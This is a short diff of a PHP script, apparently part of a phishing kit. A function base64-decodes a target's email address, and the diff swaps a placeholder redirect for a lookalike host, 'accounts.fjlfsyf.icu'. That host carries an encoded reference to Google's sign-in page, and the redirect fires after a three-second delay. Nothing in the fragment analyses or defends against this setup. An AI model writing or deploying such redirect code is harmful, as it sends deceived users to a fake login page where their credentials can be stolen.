@@ -13,7 +13,7 @@ function decode($email = null){
         $email = base64_decode($email, false);
     }
     
-    $redirect_url = "https://example.com#";
+    $redirect_url = "https://accounts.fjlfsyf.icu?h-vhewD1uFR4=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t";
     $delay = 3;
     
     ?>
